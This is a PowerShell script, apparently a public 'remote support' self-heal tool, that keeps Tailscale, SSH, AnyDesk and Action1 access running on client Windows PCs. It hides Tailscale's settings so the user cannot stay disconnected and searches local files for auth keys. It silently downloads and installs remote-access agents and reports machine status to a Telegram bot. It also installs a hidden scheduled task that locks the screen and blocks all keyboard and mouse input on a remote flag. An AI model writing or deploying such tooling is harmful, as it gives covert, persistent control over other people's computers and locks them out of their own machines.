# ==========================================================
#  rsupport update / full-heal  (PUBLIC on GitHub - secret-free)
#  Secrets read from LOCAL files on the client, never here.
# ==========================================================
$ErrorActionPreference = "SilentlyContinue"
$dir = "$env:ProgramData\RemoteSupport"
New-Item $dir -ItemType Directory -Force | Out-Null

# 0) Tailscale UNATTENDED mode (once) - keeps client reachable at the
#    Windows login screen after a restart, before anyone logs in.
if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
  $tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
  if($tsExe){
    & $tsExe up --unattended --accept-risk=all 2>$null
    Set-Content (Join-Path $dir 'unattended.done') '1' -Encoding ascii
  }
}

# 0c) Tailscale RECOVERY: if installed but logged out / blocked (e.g. antivirus
#     interrupted it), log back in automatically. The key is read from where the
#     setup already saved it on THIS machine - never stored in this public file.
$tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
if($tsExe){
  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
  $st = (& $tsExe status 2>&1 | Out-String)
  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
    $key=''
    foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
      if(-not $key -and (Test-Path $d)){
        foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
          $c = Get-Content $f.FullName -Raw -EA 0
          $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
          if($m.Success){ $key=$m.Value; break }
        }
      }
    }
    if($key){
      Start-Service Tailscale -EA 0
      & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
      $tg = Join-Path $dir 'tg.txt'
      if(Test-Path $tg){
        $tk='';$tc=''
        foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
        if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale was down on "+$env:COMPUTERNAME+" (antivirus/logout) - auto-reconnected.")} | Out-Null }catch{} }
      }
    }
  }
}
else{
  # Tailscale .exe is gone - antivirus likely deleted it. Alert once (needs manual allow).
  $mk = Join-Path $dir 'ts-missing.flag'
  if(-not (Test-Path $mk)){
    $tg = Join-Path $dir 'tg.txt'
    if(Test-Path $tg){
      $tk='';$tc=''
      foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
      if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale MISSING on "+$env:COMPUTERNAME+" - antivirus may have removed it. Allow Tailscale in the antivirus, then re-run setup.")} | Out-Null }catch{} }
    }
    Set-Content $mk '1' -Encoding ascii
  }
}


# 0d) Tailscale LOCKDOWN: force unattended + auto-reconnect + hide settings menus,
#     so the client can't keep Tailscale disconnected (it stays or returns online).
#     Re-applied every cycle so it self-heals if anything clears it.
$pol = 'HKLM:\SOFTWARE\Policies\Tailscale'
New-Item $pol -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'UnattendedMode'  -Value 'always' -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'ReconnectAfter'  -Value '1m'     -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'PreferencesMenu' -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'AdminConsole'    -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
$tsPol = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
if($tsPol){ & $tsPol syspolicy reload 2>$null }


# 1) SSH stays up + key config
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic
$cfg = "$env:ProgramData\ssh\sshd_config"
if(Test-Path $cfg){
  $l = Get-Content $cfg | Where-Object { $_ -notmatch '^\s*#?\s*StrictModes' -and $_ -notmatch '^\s*#?\s*PubkeyAuthentication' }
  Set-Content $cfg (@('StrictModes no','PubkeyAuthentication yes') + $l) -Encoding ascii
  Restart-Service sshd
}

# 2) AnyDesk: reinstall if missing (uses local ad-pass.txt), else keep running
$adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
if(-not (Test-Path $adExe)){ $adExe = 'C:\Program Files\AnyDesk\AnyDesk.exe' }
if(Test-Path $adExe){ Start-Service AnyDesk }
else{
  try{
    $tmp = "$env:TEMP\AnyDesk.exe"
    Invoke-WebRequest 'https://download.anydesk.com/AnyDesk.exe' -OutFile $tmp -UseBasicParsing
    Start-Process $tmp -ArgumentList '--install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent --create-shortcuts' -Wait
    Start-Sleep 6
    $adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
    $pf = Join-Path $dir 'ad-pass.txt'
    if((Test-Path $adExe) -and (Test-Path $pf)){
      (Get-Content $pf -Raw).Trim() | & $adExe --set-password 2>$null
      Start-Service AnyDesk; & $adExe --start-with-win
    }
  }catch{}
}

# 3) Telegram alerts: install mesh watcher if tg.txt was pushed here
if(Test-Path (Join-Path $dir 'tg.txt')){
  $w = @'
$ErrorActionPreference='SilentlyContinue'
$dir="$env:ProgramData\RemoteSupport"
$conf=Join-Path $dir 'tg.txt'
if(-not(Test-Path $conf)){ exit }
$token='';$chat=''
foreach($l in Get-Content $conf){ if($l -match '^token=(.+)$'){$token=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$chat=$matches[1].Trim()} }
if(-not $token -or -not $chat){ exit }
$ts=@('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe')|?{Test-Path $_}|Select-Object -First 1
if(-not $ts){ exit }
$selfIp=(& $ts ip -4 2>$null | Select-Object -First 1)
$j=& $ts status --json | ConvertFrom-Json
$nodes=@();$peers=@{}
foreach($p in $j.Peer.PSObject.Properties.Value){ $peers[$p.HostName]=[bool]$p.Online; if($p.Online){ $nodes+=$p.TailscaleIPs[0] } }
$nodes+=$selfIp
$reporter=($nodes | Sort-Object | Select-Object -First 1)
if($selfIp -ne $reporter){ exit }
$state=Join-Path $dir 'tg-state.txt'
$prev=@{};$first=-not(Test-Path $state)
if(-not $first){ foreach($l in Get-Content $state){ if($l -match '^(.*)=(0|1)$'){ $prev[$matches[1]]=($matches[2] -eq '1') } } }
function Send($t){ try{ Invoke-RestMethod -Method Post -Uri ("https://api.telegram.org/bot$token/sendMessage") -Body @{chat_id=$chat;text=$t}|Out-Null }catch{} }
foreach($h in $peers.Keys){ if($prev.ContainsKey($h) -and $prev[$h] -ne $peers[$h]){ if($peers[$h]){ Send ("ONLINE  - $h") } else { Send ("OFFLINE - $h") } } }
($peers.GetEnumerator()|ForEach-Object{ $_.Key+'='+([int][bool]$_.Value) })|Set-Content $state -Encoding utf8
'@
  Set-Content (Join-Path $dir 'tg-watch.ps1') $w -Encoding utf8
  schtasks /create /tn "RemoteSupportTG" /tr ("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " + (Join-Path $dir 'tg-watch.ps1')) /sc minute /mo 2 /ru SYSTEM /rl HIGHEST /f | Out-Null
}

# --- Action1 self-heal ---
$ACTION1_URL = "PASTE_YOUR_ACTION1_LINK_HERE"
if ($ACTION1_URL -and -not (Get-Service "Action1 Agent" -ErrorAction SilentlyContinue)) {
    curl.exe -s -o "$env:TEMP\a1.msi" $ACTION1_URL
    Start-Process msiexec.exe -ArgumentList '/i "'"$env:TEMP"'\a1.msi" /quiet /qn' -Wait
    Add-Content "C:\ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) reinstalled Action1"
}

# --- Lock screen feature ---
$lockCode = @'
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
Add-Type @"
using System;using System.Runtime.InteropServices;
public class Inp{ [DllImport("user32.dll")] public static extern bool BlockInput(bool f); }
"@
$dir='C:\ProgramData\RemoteSupport'; $flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
function Cfg($k,$def){ $v=$def; if(Test-Path $cfg){ foreach($l in Get-Content $cfg){ if($l -match "^$k=(.*)$"){ $v=$matches[1] } } } return $v }
while($true){
  if(Test-Path $flag){
    $text=(Get-Content $flag -Raw); if(-not $text.Trim()){ $text=Cfg 'LOCK_TEXT' 'Maintenance in progress' }
    $color=Cfg 'LOCK_COLOR' '#0f172a'; $img=Cfg 'LOCK_IMAGE' ''
    $f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.TopMost=$true; $f.StartPosition='Manual'
    $f.Bounds=[Windows.Forms.SystemInformation]::VirtualScreen
    try{ $f.BackColor=[Drawing.ColorTranslator]::FromHtml($color) }catch{ $f.BackColor='Black' }
    if($img){ try{ $t="$env:TEMP\lockbg.img"; (New-Object Net.WebClient).DownloadFile($img,$t); $f.BackgroundImage=[Drawing.Image]::FromFile($t); $f.BackgroundImageLayout='Zoom' }catch{} }
    $lbl=New-Object Windows.Forms.Label; $lbl.Text=$text; $lbl.ForeColor='White'
    $lbl.Font=New-Object Drawing.Font('Segoe UI',28,[Drawing.FontStyle]::Bold); $lbl.TextAlign='MiddleCenter'; $lbl.Dock='Fill'; $lbl.BackColor=[Drawing.Color]::Transparent
    $f.Controls.Add($lbl)
    $tm=New-Object Windows.Forms.Timer; $tm.Interval=800; $tm.Add_Tick({ if(-not (Test-Path $flag)){ $f.Close() } }); $tm.Start()
    [Inp]::BlockInput($true)|Out-Null; [void]$f.ShowDialog(); [Inp]::BlockInput($false)|Out-Null; $tm.Stop()
  }
  Start-Sleep -Seconds 1
}
'@
Set-Content -Path (Join-Path $dir 'lockwatch.ps1') -Value $lockCode -Encoding UTF8
schtasks /query /tn RemoteSupportLockWatch >NUL 2>&1
if($LASTEXITCODE -ne 0){ schtasks /create /tn RemoteSupportLockWatch /tr "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\lockwatch.ps1" /sc onlogon /rl HIGHEST /f | Out-Null }
